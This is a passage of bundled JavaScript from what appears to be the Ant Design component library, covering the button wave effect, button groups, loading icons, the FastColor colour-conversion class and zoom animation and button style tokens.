      s === "Checkbox" &&
      !(!((o = i.querySelector("input")) === null || o === void 0) && o.checked)
    )
      return;
    const tt = document.createElement("div");
    (tt.style.position = "absolute"),
      (tt.style.left = "0px"),
      (tt.style.top = "0px"),
      i == null || i.insertBefore(tt, i == null ? void 0 : i.firstChild);
    const nt = getReactRender();
    let ot = null;
    function st() {
      return ot;
    }
    ot = nt(
      reactExports.createElement(
        WaveEffect,
        Object.assign({}, a, { target: i, registerUnmount: st })
      ),
      tt
    );
  },
  useWave = (i, a, o) => {
    const { wave: s } = reactExports.useContext(ConfigContext),
      [, tt, nt] = useToken(),
      ot = useEvent((ht) => {
        const gt = i.current;
        if ((s != null && s.disabled) || !gt) return;
        const St = gt.querySelector(`.${TARGET_CLS}`) || gt,
          { showEffect: vt } = s || {};
        (vt || showWaveEffect)(St, {
          className: a,
          token: tt,
          component: o,
          event: ht,
          hashId: nt,
        });
      }),
      st = reactExports.useRef(null);
    return (ht) => {
      wrapperRaf.cancel(st.current),
        (st.current = wrapperRaf(() => {
          ot(ht);
        }));
    };
  },
  Wave = (i) => {
    const { children: a, disabled: o, component: s } = i,
      { getPrefixCls: tt } = reactExports.useContext(ConfigContext),
      nt = reactExports.useRef(null),
      ot = tt("wave"),
      [, st] = useStyle$5(ot),
      ft = useWave(nt, classNames(ot, st), s);
    if (
      (React$1.useEffect(() => {
        const gt = nt.current;
        if (!gt || gt.nodeType !== 1 || o) return;
        const St = (vt) => {
          !isVisible(vt.target) ||
            !gt.getAttribute ||
            gt.getAttribute("disabled") ||
            gt.disabled ||
            gt.className.includes("disabled") ||
            gt.className.includes("-leave") ||
            ft(vt);
        };
        return (
          gt.addEventListener("click", St, !0),
          () => {
            gt.removeEventListener("click", St, !0);
          }
        );
      }, [o]),
      !React$1.isValidElement(a))
    )
      return a ?? null;
    const ht = supportRef(a) ? composeRef(getNodeRef(a), nt) : nt;
    return cloneElement(a, { ref: ht });
  },
  useSize = (i) => {
    const a = React$1.useContext(SizeContext);
    return React$1.useMemo(
      () =>
        i
          ? typeof i == "string"
            ? i ?? a
            : i instanceof Function
            ? i(a)
            : a
          : a,
      [i, a]
    );
  },
  SpaceCompactItemContext = reactExports.createContext(null),
  useCompactItemContext = (i, a) => {
    const o = reactExports.useContext(SpaceCompactItemContext),
      s = reactExports.useMemo(() => {
        if (!o) return "";
        const { compactDirection: tt, isFirstItem: nt, isLastItem: ot } = o,
          st = tt === "vertical" ? "-vertical-" : "-";
        return classNames(`${i}-compact${st}item`, {
          [`${i}-compact${st}first-item`]: nt,
          [`${i}-compact${st}last-item`]: ot,
          [`${i}-compact${st}item-rtl`]: a === "rtl",
        });
      }, [i, a, o]);
    return {
      compactSize: o == null ? void 0 : o.compactSize,
      compactDirection: o == null ? void 0 : o.compactDirection,
      compactItemClassnames: s,
    };
  },
  NoCompactStyle = (i) => {
    let { children: a } = i;
    return reactExports.createElement(
      SpaceCompactItemContext.Provider,
      { value: null },
      a
    );
  };
var __rest$9 = function (i, a) {
  var o = {};
  for (var s in i)
    Object.prototype.hasOwnProperty.call(i, s) &&
      a.indexOf(s) < 0 &&
      (o[s] = i[s]);
  if (i != null && typeof Object.getOwnPropertySymbols == "function")
    for (var tt = 0, s = Object.getOwnPropertySymbols(i); tt < s.length; tt++)
      a.indexOf(s[tt]) < 0 &&
        Object.prototype.propertyIsEnumerable.call(i, s[tt]) &&
        (o[s[tt]] = i[s[tt]]);
  return o;
};
const GroupSizeContext = reactExports.createContext(void 0),
  ButtonGroup = (i) => {
    const { getPrefixCls: a, direction: o } =
        reactExports.useContext(ConfigContext),
      { prefixCls: s, size: tt, className: nt } = i,
      ot = __rest$9(i, ["prefixCls", "size", "className"]),
      st = a("btn-group", s),
      [, , ft] = useToken();
    let ht = "";
    switch (tt) {
      case "large":
        ht = "lg";
        break;
      case "small":
        ht = "sm";
        break;
    }
    const gt = classNames(
      st,
      { [`${st}-${ht}`]: ht, [`${st}-rtl`]: o === "rtl" },
      nt,
      ft
    );
    return reactExports.createElement(
      GroupSizeContext.Provider,
      { value: tt },
      reactExports.createElement(
        "div",
        Object.assign({}, ot, { className: gt })
      )
    );
  },
  rxTwoCNChar = /^[\u4E00-\u9FA5]{2}$/,
  isTwoCNChar = rxTwoCNChar.test.bind(rxTwoCNChar);
function isString(i) {
  return typeof i == "string";
}
function isUnBorderedButtonVariant(i) {
  return i === "text" || i === "link";
}
function splitCNCharsBySpace(i, a) {
  if (i == null) return;
  const o = a ? " " : "";
  return typeof i != "string" &&
    typeof i != "number" &&
    isString(i.type) &&
    isTwoCNChar(i.props.children)
    ? cloneElement(i, { children: i.props.children.split("").join(o) })
    : isString(i)
    ? isTwoCNChar(i)
      ? React$1.createElement("span", null, i.split("").join(o))
      : React$1.createElement("span", null, i)
    : isFragment(i)
    ? React$1.createElement("span", null, i)
    : i;
}
function spaceChildren(i, a) {
  let o = !1;
  const s = [];
  return (
    React$1.Children.forEach(i, (tt) => {
      const nt = typeof tt,
        ot = nt === "string" || nt === "number";
      if (o && ot) {
        const st = s.length - 1,
          ft = s[st];
        s[st] = `${ft}${tt}`;
      } else s.push(tt);
      o = ot;
    }),
    React$1.Children.map(s, (tt) => splitCNCharsBySpace(tt, a))
  );
}
const IconWrapper = reactExports.forwardRef((i, a) => {
    const { className: o, style: s, children: tt, prefixCls: nt } = i,
      ot = classNames(`${nt}-icon`, o);
    return React$1.createElement(
      "span",
      { ref: a, className: ot, style: s },
      tt
    );
  }),
  InnerLoadingIcon = reactExports.forwardRef((i, a) => {
    const { prefixCls: o, className: s, style: tt, iconClassName: nt } = i,
      ot = classNames(`${o}-loading-icon`, s);
    return React$1.createElement(
      IconWrapper,
      { prefixCls: o, className: ot, style: tt, ref: a },
      React$1.createElement(RefIcon$7, { className: nt })
    );
  }),
  getCollapsedWidth = () => ({ width: 0, opacity: 0, transform: "scale(0)" }),
  getRealWidth = (i) => ({
    width: i.scrollWidth,
    opacity: 1,
    transform: "scale(1)",
  }),
  LoadingIcon = (i) => {
    const {
        prefixCls: a,
        loading: o,
        existIcon: s,
        className: tt,
        style: nt,
        mount: ot,
      } = i,
      st = !!o;
    return s
      ? React$1.createElement(InnerLoadingIcon, {
          prefixCls: a,
          className: tt,
          style: nt,
        })
      : React$1.createElement(
          CSSMotion,
          {
            visible: st,
            motionName: `${a}-loading-icon-motion`,
            motionAppear: !ot,
            motionEnter: !ot,
            motionLeave: !ot,
            removeOnLeave: !0,
            onAppearStart: getCollapsedWidth,
            onAppearActive: getRealWidth,
            onEnterStart: getCollapsedWidth,
            onEnterActive: getRealWidth,
            onLeaveStart: getRealWidth,
            onLeaveActive: getCollapsedWidth,
          },
          (ft, ht) => {
            let { className: gt, style: St } = ft;
            const vt = Object.assign(Object.assign({}, nt), St);
            return React$1.createElement(InnerLoadingIcon, {
              prefixCls: a,
              className: classNames(tt, gt),
              style: vt,
              ref: ht,
            });
          }
        );
  },
  genButtonBorderStyle = (i, a) => ({
    [`> span, > ${i}`]: {
      "&:not(:last-child)": {
        [`&, & > ${i}`]: { "&:not(:disabled)": { borderInlineEndColor: a } },
      },
      "&:not(:first-child)": {
        [`&, & > ${i}`]: { "&:not(:disabled)": { borderInlineStartColor: a } },
      },
    },
  }),
  genGroupStyle$1 = (i) => {
    const {
      componentCls: a,
      fontSize: o,
      lineWidth: s,
      groupBorderColor: tt,
      colorErrorHover: nt,
    } = i;
    return {
      [`${a}-group`]: [
        {
          position: "relative",
          display: "inline-flex",
          [`> span, > ${a}`]: {
            "&:not(:last-child)": {
              [`&, & > ${a}`]: {
                borderStartEndRadius: 0,
                borderEndEndRadius: 0,
              },
            },
            "&:not(:first-child)": {
              marginInlineStart: i.calc(s).mul(-1).equal(),
              [`&, & > ${a}`]: {
                borderStartStartRadius: 0,
                borderEndStartRadius: 0,
              },
            },
          },
          [a]: {
            position: "relative",
            zIndex: 1,
            "&:hover, &:focus, &:active": { zIndex: 2 },
            "&[disabled]": { zIndex: 0 },
          },
          [`${a}-icon-only`]: { fontSize: o },
        },
        genButtonBorderStyle(`${a}-primary`, tt),
        genButtonBorderStyle(`${a}-danger`, nt),
      ],
    };
  },
  round = Math.round;
function splitColorStr(i, a) {
  const o =
      i
        .replace(/^[^(]*\((.*)/, "$1")
        .replace(/\).*/, "")
        .match(/\d*\.?\d+%?/g) || [],
    s = o.map((tt) => parseFloat(tt));
  for (let tt = 0; tt < 3; tt += 1) s[tt] = a(s[tt] || 0, o[tt] || "", tt);
  return o[3] ? (s[3] = o[3].includes("%") ? s[3] / 100 : s[3]) : (s[3] = 1), s;
}
const parseHSVorHSL = (i, a, o) => (o === 0 ? i : i / 100);
function limitRange(i, a) {
  const o = a || 255;
  return i > o ? o : i < 0 ? 0 : i;
}
class FastColor {
  constructor(a) {
    _defineProperty$1(this, "isValid", !0),
      _defineProperty$1(this, "r", 0),
      _defineProperty$1(this, "g", 0),
      _defineProperty$1(this, "b", 0),
      _defineProperty$1(this, "a", 1),
      _defineProperty$1(this, "_h", void 0),
      _defineProperty$1(this, "_s", void 0),
      _defineProperty$1(this, "_l", void 0),
      _defineProperty$1(this, "_v", void 0),
      _defineProperty$1(this, "_max", void 0),
      _defineProperty$1(this, "_min", void 0),
      _defineProperty$1(this, "_brightness", void 0);
    function o(tt) {
      return tt[0] in a && tt[1] in a && tt[2] in a;
    }
    if (a)
      if (typeof a == "string") {
        let nt = function (ot) {
          return tt.startsWith(ot);
        };
        var s = nt;
        const tt = a.trim();
        /^#?[A-F\d]{3,8}$/i.test(tt)
          ? this.fromHexString(tt)
          : nt("rgb")
          ? this.fromRgbString(tt)
          : nt("hsl")
          ? this.fromHslString(tt)
          : (nt("hsv") || nt("hsb")) && this.fromHsvString(tt);
      } else if (a instanceof FastColor)
        (this.r = a.r),
          (this.g = a.g),
          (this.b = a.b),
          (this.a = a.a),
          (this._h = a._h),
          (this._s = a._s),
          (this._l = a._l),
          (this._v = a._v);
      else if (o("rgb"))
        (this.r = limitRange(a.r)),
          (this.g = limitRange(a.g)),
          (this.b = limitRange(a.b)),
          (this.a = typeof a.a == "number" ? limitRange(a.a, 1) : 1);
      else if (o("hsl")) this.fromHsl(a);
      else if (o("hsv")) this.fromHsv(a);
      else
        throw new Error(
          "@ant-design/fast-color: unsupported input " + JSON.stringify(a)
        );
  }
  setR(a) {
    return this._sc("r", a);
  }
  setG(a) {
    return this._sc("g", a);
  }
  setB(a) {
    return this._sc("b", a);
  }
  setA(a) {
    return this._sc("a", a, 1);
  }
  setHue(a) {
    const o = this.toHsv();
    return (o.h = a), this._c(o);
  }
  getLuminance() {
    function a(nt) {
      const ot = nt / 255;
      return ot <= 0.03928 ? ot / 12.92 : Math.pow((ot + 0.055) / 1.055, 2.4);
    }
    const o = a(this.r),
      s = a(this.g),
      tt = a(this.b);
    return 0.2126 * o + 0.7152 * s + 0.0722 * tt;
  }
  getHue() {
    if (typeof this._h > "u") {
      const a = this.getMax() - this.getMin();
      a === 0
        ? (this._h = 0)
        : (this._h = round(
            60 *
              (this.r === this.getMax()
                ? (this.g - this.b) / a + (this.g < this.b ? 6 : 0)
                : this.g === this.getMax()
                ? (this.b - this.r) / a + 2
                : (this.r - this.g) / a + 4)
          ));
    }
    return this._h;
  }
  getSaturation() {
    if (typeof this._s > "u") {
      const a = this.getMax() - this.getMin();
      a === 0 ? (this._s = 0) : (this._s = a / this.getMax());
    }
    return this._s;
  }
  getLightness() {
    return (
      typeof this._l > "u" && (this._l = (this.getMax() + this.getMin()) / 510),
      this._l
    );
  }
  getValue() {
    return typeof this._v > "u" && (this._v = this.getMax() / 255), this._v;
  }
  getBrightness() {
    return (
      typeof this._brightness > "u" &&
        (this._brightness = (this.r * 299 + this.g * 587 + this.b * 114) / 1e3),
      this._brightness
    );
  }
  darken(a = 10) {
    const o = this.getHue(),
      s = this.getSaturation();
    let tt = this.getLightness() - a / 100;
    return tt < 0 && (tt = 0), this._c({ h: o, s, l: tt, a: this.a });
  }
  lighten(a = 10) {
    const o = this.getHue(),
      s = this.getSaturation();
    let tt = this.getLightness() + a / 100;
    return tt > 1 && (tt = 1), this._c({ h: o, s, l: tt, a: this.a });
  }
  mix(a, o = 50) {
    const s = this._c(a),
      tt = o / 100,
      nt = (st) => (s[st] - this[st]) * tt + this[st],
      ot = {
        r: round(nt("r")),
        g: round(nt("g")),
        b: round(nt("b")),
        a: round(nt("a") * 100) / 100,
      };
    return this._c(ot);
  }
  tint(a = 10) {
    return this.mix({ r: 255, g: 255, b: 255, a: 1 }, a);
  }
  shade(a = 10) {
    return this.mix({ r: 0, g: 0, b: 0, a: 1 }, a);
  }
  onBackground(a) {
    const o = this._c(a),
      s = this.a + o.a * (1 - this.a),
      tt = (nt) => round((this[nt] * this.a + o[nt] * o.a * (1 - this.a)) / s);
    return this._c({ r: tt("r"), g: tt("g"), b: tt("b"), a: s });
  }
  isDark() {
    return this.getBrightness() < 128;
  }
  isLight() {
    return this.getBrightness() >= 128;
  }
  equals(a) {
    return this.r === a.r && this.g === a.g && this.b === a.b && this.a === a.a;
  }
  clone() {
    return this._c(this);
  }
  toHexString() {
    let a = "#";
    const o = (this.r || 0).toString(16);
    a += o.length === 2 ? o : "0" + o;
    const s = (this.g || 0).toString(16);
    a += s.length === 2 ? s : "0" + s;
    const tt = (this.b || 0).toString(16);
    if (
      ((a += tt.length === 2 ? tt : "0" + tt),
      typeof this.a == "number" && this.a >= 0 && this.a < 1)
    ) {
      const nt = round(this.a * 255).toString(16);
      a += nt.length === 2 ? nt : "0" + nt;
    }
    return a;
  }
  toHsl() {
    return {
      h: this.getHue(),
      s: this.getSaturation(),
      l: this.getLightness(),
      a: this.a,
    };
  }
  toHslString() {
    const a = this.getHue(),
      o = round(this.getSaturation() * 100),
      s = round(this.getLightness() * 100);
    return this.a !== 1
      ? `hsla(${a},${o}%,${s}%,${this.a})`
      : `hsl(${a},${o}%,${s}%)`;
  }
  toHsv() {
    return {
      h: this.getHue(),
      s: this.getSaturation(),
      v: this.getValue(),
      a: this.a,
    };
  }
  toRgb() {
    return { r: this.r, g: this.g, b: this.b, a: this.a };
  }
  toRgbString() {
    return this.a !== 1
      ? `rgba(${this.r},${this.g},${this.b},${this.a})`
      : `rgb(${this.r},${this.g},${this.b})`;
  }
  toString() {
    return this.toRgbString();
  }
  _sc(a, o, s) {
    const tt = this.clone();
    return (tt[a] = limitRange(o, s)), tt;
  }
  _c(a) {
    return new this.constructor(a);
  }
  getMax() {
    return (
      typeof this._max > "u" && (this._max = Math.max(this.r, this.g, this.b)),
      this._max
    );
  }
  getMin() {
    return (
      typeof this._min > "u" && (this._min = Math.min(this.r, this.g, this.b)),
      this._min
    );
  }
  fromHexString(a) {
    const o = a.replace("#", "");
    function s(tt, nt) {
      return parseInt(o[tt] + o[nt || tt], 16);
    }
    o.length < 6
      ? ((this.r = s(0)),
        (this.g = s(1)),
        (this.b = s(2)),
        (this.a = o[3] ? s(3) / 255 : 1))
      : ((this.r = s(0, 1)),
        (this.g = s(2, 3)),
        (this.b = s(4, 5)),
        (this.a = o[6] ? s(6, 7) / 255 : 1));
  }
  fromHsl({ h: a, s: o, l: s, a: tt }) {
    if (
      ((this._h = a % 360),
      (this._s = o),
      (this._l = s),
      (this.a = typeof tt == "number" ? tt : 1),
      o <= 0)
    ) {
      const vt = round(s * 255);
      (this.r = vt), (this.g = vt), (this.b = vt);
    }
    let nt = 0,
      ot = 0,
      st = 0;
    const ft = a / 60,
      ht = (1 - Math.abs(2 * s - 1)) * o,
      gt = ht * (1 - Math.abs((ft % 2) - 1));
    ft >= 0 && ft < 1
      ? ((nt = ht), (ot = gt))
      : ft >= 1 && ft < 2
      ? ((nt = gt), (ot = ht))
      : ft >= 2 && ft < 3
      ? ((ot = ht), (st = gt))
      : ft >= 3 && ft < 4
      ? ((ot = gt), (st = ht))
      : ft >= 4 && ft < 5
      ? ((nt = gt), (st = ht))
      : ft >= 5 && ft < 6 && ((nt = ht), (st = gt));
    const St = s - ht / 2;
    (this.r = round((nt + St) * 255)),
      (this.g = round((ot + St) * 255)),
      (this.b = round((st + St) * 255));
  }
  fromHsv({ h: a, s: o, v: s, a: tt }) {
    (this._h = a % 360),
      (this._s = o),
      (this._v = s),
      (this.a = typeof tt == "number" ? tt : 1);
    const nt = round(s * 255);
    if (((this.r = nt), (this.g = nt), (this.b = nt), o <= 0)) return;
    const ot = a / 60,
      st = Math.floor(ot),
      ft = ot - st,
      ht = round(s * (1 - o) * 255),
      gt = round(s * (1 - o * ft) * 255),
      St = round(s * (1 - o * (1 - ft)) * 255);
    switch (st) {
      case 0:
        (this.g = St), (this.b = ht);
        break;
      case 1:
        (this.r = gt), (this.b = ht);
        break;
      case 2:
        (this.r = ht), (this.b = St);
        break;
      case 3:
        (this.r = ht), (this.g = gt);
        break;
      case 4:
        (this.r = St), (this.g = ht);
        break;
      case 5:
      default:
        (this.g = ht), (this.b = gt);
        break;
    }
  }
  fromHsvString(a) {
    const o = splitColorStr(a, parseHSVorHSL);
    this.fromHsv({ h: o[0], s: o[1], v: o[2], a: o[3] });
  }
  fromHslString(a) {
    const o = splitColorStr(a, parseHSVorHSL);
    this.fromHsl({ h: o[0], s: o[1], l: o[2], a: o[3] });
  }
  fromRgbString(a) {
    const o = splitColorStr(a, (s, tt) =>
      tt.includes("%") ? round((s / 100) * 255) : s
    );
    (this.r = o[0]), (this.g = o[1]), (this.b = o[2]), (this.a = o[3]);
  }
}
var _excluded$b = ["b"],
  _excluded2 = ["v"],
  getRoundNumber = function (a) {
    return Math.round(Number(a || 0));
  },
  convertHsb2Hsv = function (a) {
    if (a instanceof FastColor) return a;
    if (a && _typeof(a) === "object" && "h" in a && "b" in a) {
      var o = a,
        s = o.b,
        tt = _objectWithoutProperties$1(o, _excluded$b);
      return _objectSpread2$1(_objectSpread2$1({}, tt), {}, { v: s });
    }
    return typeof a == "string" && /hsb/.test(a) ? a.replace(/hsb/, "hsv") : a;
  },
  Color = (function (i) {
    _inherits(o, i);
    var a = _createSuper(o);
    function o(s) {
      return _classCallCheck(this, o), a.call(this, convertHsb2Hsv(s));
    }
    return (
      _createClass(o, [
        {
          key: "toHsbString",
          value: function () {
            var tt = this.toHsb(),
              nt = getRoundNumber(tt.s * 100),
              ot = getRoundNumber(tt.b * 100),
              st = getRoundNumber(tt.h),
              ft = tt.a,
              ht = "hsb(".concat(st, ", ").concat(nt, "%, ").concat(ot, "%)"),
              gt = "hsba("
                .concat(st, ", ")
                .concat(nt, "%, ")
                .concat(ot, "%, ")
                .concat(ft.toFixed(ft === 0 ? 0 : 2), ")");
            return ft === 1 ? ht : gt;
          },
        },
        {
          key: "toHsb",
          value: function () {
            var tt = this.toHsv(),
              nt = tt.v,
              ot = _objectWithoutProperties$1(tt, _excluded2);
            return _objectSpread2$1(
              _objectSpread2$1({}, ot),
              {},
              { b: nt, a: this.a }
            );
          },
        },
      ]),
      o
    );
  })(FastColor),
  generateColor = function (a) {
    return a instanceof Color ? a : new Color(a);
  };
generateColor("#1677ff");
const toHexFormat = (i, a) =>
    (i == null ? void 0 : i.replace(/[^\w/]/g, "").slice(0, a ? 8 : 6)) || "",
  getHex = (i, a) => (i ? toHexFormat(i, a) : "");
let AggregationColor = (function () {
  function i(a) {
    _classCallCheck(this, i);
    var o;
    if (((this.cleared = !1), a instanceof i)) {
      (this.metaColor = a.metaColor.clone()),
        (this.colors =
          (o = a.colors) === null || o === void 0
            ? void 0
            : o.map((tt) => ({ color: new i(tt.color), percent: tt.percent }))),
        (this.cleared = a.cleared);
      return;
    }
    const s = Array.isArray(a);
    s && a.length
      ? ((this.colors = a.map((tt) => {
          let { color: nt, percent: ot } = tt;
          return { color: new i(nt), percent: ot };
        })),
        (this.metaColor = new Color(this.colors[0].color.metaColor)))
      : (this.metaColor = new Color(s ? "" : a)),
      (!a || (s && !this.colors)) &&
        ((this.metaColor = this.metaColor.setA(0)), (this.cleared = !0));
  }
  return _createClass(i, [
    {
      key: "toHsb",
      value: function () {
        return this.metaColor.toHsb();
      },
    },
    {
      key: "toHsbString",
      value: function () {
        return this.metaColor.toHsbString();
      },
    },
    {
      key: "toHex",
      value: function () {
        return getHex(this.toHexString(), this.metaColor.a < 1);
      },
    },
    {
      key: "toHexString",
      value: function () {
        return this.metaColor.toHexString();
      },
    },
    {
      key: "toRgb",
      value: function () {
        return this.metaColor.toRgb();
      },
    },
    {
      key: "toRgbString",
      value: function () {
        return this.metaColor.toRgbString();
      },
    },
    {
      key: "isGradient",
      value: function () {
        return !!this.colors && !this.cleared;
      },
    },
    {
      key: "getColors",
      value: function () {
        return this.colors || [{ color: this, percent: 0 }];
      },
    },
    {
      key: "toCssString",
      value: function () {
        const { colors: o } = this;
        return o
          ? `linear-gradient(90deg, ${o
              .map((tt) => `${tt.color.toRgbString()} ${tt.percent}%`)
              .join(", ")})`
          : this.metaColor.toRgbString();
      },
    },
    {
      key: "equals",
      value: function (o) {
        return !o || this.isGradient() !== o.isGradient()
          ? !1
          : this.isGradient()
          ? this.colors.length === o.colors.length &&
            this.colors.every((s, tt) => {
              const nt = o.colors[tt];
              return s.percent === nt.percent && s.color.equals(nt.color);
            })
          : this.toHexString() === o.toHexString();
      },
    },
  ]);
})();
const initMotionCommon = (i) => ({
    animationDuration: i,
    animationFillMode: "both",
  }),
  initMotionCommonLeave = (i) => ({
    animationDuration: i,
    animationFillMode: "both",
  }),
  initMotion = function (i, a, o, s) {
    const nt = (
      arguments.length > 4 && arguments[4] !== void 0 ? arguments[4] : !1
    )
      ? "&"
      : "";
    return {
      [`
      ${nt}${i}-enter,
      ${nt}${i}-appear
    `]: Object.assign(Object.assign({}, initMotionCommon(s)), {
        animationPlayState: "paused",
      }),
      [`${nt}${i}-leave`]: Object.assign(
        Object.assign({}, initMotionCommonLeave(s)),
        { animationPlayState: "paused" }
      ),
      [`
      ${nt}${i}-enter${i}-enter-active,
      ${nt}${i}-appear${i}-appear-active
    `]: { animationName: a, animationPlayState: "running" },
      [`${nt}${i}-leave${i}-leave-active`]: {
        animationName: o,
        animationPlayState: "running",
        pointerEvents: "none",
      },
    };
  },
  zoomIn = new Keyframe("antZoomIn", {
    "0%": { transform: "scale(0.2)", opacity: 0 },
    "100%": { transform: "scale(1)", opacity: 1 },
  }),
  zoomOut = new Keyframe("antZoomOut", {
    "0%": { transform: "scale(1)" },
    "100%": { transform: "scale(0.2)", opacity: 0 },
  }),
  zoomBigIn = new Keyframe("antZoomBigIn", {
    "0%": { transform: "scale(0.8)", opacity: 0 },
    "100%": { transform: "scale(1)", opacity: 1 },
  }),
  zoomBigOut = new Keyframe("antZoomBigOut", {
    "0%": { transform: "scale(1)" },
    "100%": { transform: "scale(0.8)", opacity: 0 },
  }),
  zoomUpIn = new Keyframe("antZoomUpIn", {
    "0%": { transform: "scale(0.8)", transformOrigin: "50% 0%", opacity: 0 },
    "100%": { transform: "scale(1)", transformOrigin: "50% 0%" },
  }),
  zoomUpOut = new Keyframe("antZoomUpOut", {
    "0%": { transform: "scale(1)", transformOrigin: "50% 0%" },
    "100%": { transform: "scale(0.8)", transformOrigin: "50% 0%", opacity: 0 },
  }),
  zoomLeftIn = new Keyframe("antZoomLeftIn", {
    "0%": { transform: "scale(0.8)", transformOrigin: "0% 50%", opacity: 0 },
    "100%": { transform: "scale(1)", transformOrigin: "0% 50%" },
  }),
  zoomLeftOut = new Keyframe("antZoomLeftOut", {
    "0%": { transform: "scale(1)", transformOrigin: "0% 50%" },
    "100%": { transform: "scale(0.8)", transformOrigin: "0% 50%", opacity: 0 },
  }),
  zoomRightIn = new Keyframe("antZoomRightIn", {
    "0%": { transform: "scale(0.8)", transformOrigin: "100% 50%", opacity: 0 },
    "100%": { transform: "scale(1)", transformOrigin: "100% 50%" },
  }),
  zoomRightOut = new Keyframe("antZoomRightOut", {
    "0%": { transform: "scale(1)", transformOrigin: "100% 50%" },
    "100%": {
      transform: "scale(0.8)",
      transformOrigin: "100% 50%",
      opacity: 0,
    },
  }),
  zoomDownIn = new Keyframe("antZoomDownIn", {
    "0%": { transform: "scale(0.8)", transformOrigin: "50% 100%", opacity: 0 },
    "100%": { transform: "scale(1)", transformOrigin: "50% 100%" },
  }),
  zoomDownOut = new Keyframe("antZoomDownOut", {
    "0%": { transform: "scale(1)", transformOrigin: "50% 100%" },
    "100%": {
      transform: "scale(0.8)",
      transformOrigin: "50% 100%",
      opacity: 0,
    },
  }),
  zoomMotion = {
    zoom: { inKeyframes: zoomIn, outKeyframes: zoomOut },
    "zoom-big": { inKeyframes: zoomBigIn, outKeyframes: zoomBigOut },
    "zoom-big-fast": { inKeyframes: zoomBigIn, outKeyframes: zoomBigOut },
    "zoom-left": { inKeyframes: zoomLeftIn, outKeyframes: zoomLeftOut },
    "zoom-right": { inKeyframes: zoomRightIn, outKeyframes: zoomRightOut },
    "zoom-up": { inKeyframes: zoomUpIn, outKeyframes: zoomUpOut },
    "zoom-down": { inKeyframes: zoomDownIn, outKeyframes: zoomDownOut },
  },
  initZoomMotion = (i, a) => {
    const { antCls: o } = i,
      s = `${o}-${a}`,
      { inKeyframes: tt, outKeyframes: nt } = zoomMotion[a];
    return [
      initMotion(s, tt, nt, i.motionDurationFast),
      {
        [`
        ${s}-enter,
        ${s}-appear
      `]: {
          transform: "scale(0)",
          opacity: 0,
          animationTimingFunction: i.motionEaseOutCirc,
          "&-prepare": { transform: "none" },
        },
        [`${s}-leave`]: { animationTimingFunction: i.motionEaseInOutCirc },
      },
    ];
  },
  isBright = (i, a) => {
    const { r: o, g: s, b: tt, a: nt } = i.toRgb(),
      ot = new Color(i.toRgbString()).onBackground(a).toHsv();
    return nt <= 0.5 ? ot.v > 0.5 : o * 0.299 + s * 0.587 + tt * 0.114 > 192;
  },
  prepareToken = (i) => {
    const { paddingInline: a, onlyIconSize: o } = i;
    return merge(i, {
      buttonPaddingHorizontal: a,
      buttonPaddingVertical: 0,
      buttonIconOnlyFontSize: o,
    });
  },
  prepareComponentToken$2 = (i) => {
    var a, o, s, tt, nt, ot;
    const st =
        (a = i.contentFontSize) !== null && a !== void 0 ? a : i.fontSize,
      ft = (o = i.contentFontSizeSM) !== null && o !== void 0 ? o : i.fontSize,
      ht =
        (s = i.contentFontSizeLG) !== null && s !== void 0 ? s : i.fontSizeLG,
      gt =
        (tt = i.contentLineHeight) !== null && tt !== void 0
          ? tt
          : getLineHeight(st),
      St =
        (nt = i.contentLineHeightSM) !== null && nt !== void 0
          ? nt
          : getLineHeight(ft),
      vt =
        (ot = i.contentLineHeightLG) !== null && ot !== void 0
          ? ot
          : getLineHeight(ht),
      _t = isBright(new AggregationColor(i.colorBgSolid), "#fff")
        ? "#000"
        : "#fff";
    return {
      fontWeight: 400,
      defaultShadow: `0 ${i.controlOutlineWidth}px 0 ${i.controlTmpOutline}`,
      primaryShadow: `0 ${i.controlOutlineWidth}px 0 ${i.controlOutline}`,
      dangerShadow: `0 ${i.controlOutlineWidth}px 0 ${i.colorErrorOutline}`,
      primaryColor: i.colorTextLightSolid,
      dangerColor: i.colorTextLightSolid,
      borderColorDisabled: i.colorBorder,
      defaultGhostColor: i.colorBgContainer,
      ghostBg: "transparent",
      defaultGhostBorderColor: i.colorBgContainer,
      paddingInline: i.paddingContentHorizontal - i.lineWidth,
      paddingInlineLG: i.paddingContentHorizontal - i.lineWidth,
      paddingInlineSM: 8 - i.lineWidth,
      onlyIconSize: i.fontSizeLG,
      onlyIconSizeSM: i.fontSizeLG - 2,
      onlyIconSizeLG: i.fontSizeLG + 2,
      groupBorderColor: i.colorPrimaryHover,
      linkHoverBg: "transparent",
      textTextColor: i.colorText,
      textTextHoverColor: i.colorText,
      textTextActiveColor: i.colorText,
      textHoverBg: i.colorFillTertiary,
      defaultColor: i.colorText,
      defaultBg: i.colorBgContainer,
      defaultBorderColor: i.colorBorder,
      defaultBorderColorDisabled: i.colorBorder,
      defaultHoverBg: i.colorBgContainer,
      defaultHoverColor: i.colorPrimaryHover,
      defaultHoverBorderColor: i.colorPrimaryHover,
      defaultActiveBg: i.colorBgContainer,
      defaultActiveColor: i.colorPrimaryActive,
      defaultActiveBorderColor: i.colorPrimaryActive,
      solidTextColor: _t,
      contentFontSize: st,
      contentFontSizeSM: ft,
      contentFontSizeLG: ht,
      contentLineHeight: gt,
      contentLineHeightSM: St,
      contentLineHeightLG: vt,
      paddingBlock: Math.max((i.controlHeight - st * gt) / 2 - i.lineWidth, 0),
      paddingBlockSM: Math.max(
        (i.controlHeightSM - ft * St) / 2 - i.lineWidth,
        0
      ),
      paddingBlockLG: Math.max(
        (i.controlHeightLG - ht * vt) / 2 - i.lineWidth,
        0
      ),
    };
  },
  genSharedButtonStyle = (i) => {
    const {
      componentCls: a,
      iconCls: o,
      fontWeight: s,
      opacityLoading: tt,
      motionDurationSlow: nt,
      motionEaseInOut: ot,
      marginXS: st,
      calc: ft,
    } = i;
    return {
      [a]: {
        outline: "none",
        position: "relative",
        display: "inline-flex",
        gap: i.marginXS,
        alignItems: "center",
        justifyContent: "center",
        fontWeight: s,
        whiteSpace: "nowrap",
        textAlign: "center",
        backgroundImage: "none",
        background: "transparent",
        border: `${unit$1(i.lineWidth)} ${i.lineType} transparent`,
        cursor: "pointer",
        transition: `all ${i.motionDurationMid} ${i.motionEaseInOut}`,
        userSelect: "none",
        touchAction: "manipulation",
        color: i.colorText,
        "&:disabled > *": { pointerEvents: "none" },
        [`${a}-icon > svg`]: resetIcon(),
        "> a": { color: "currentColor" },
        "&:not(:disabled)": genFocusStyle(i),
        [`&${a}-two-chinese-chars::first-letter`]: { letterSpacing: "0.34em" },
        [`&${a}-two-chinese-chars > *:not(${o})`]: {
          marginInlineEnd: "-0.34em",
          letterSpacing: "0.34em",
        },
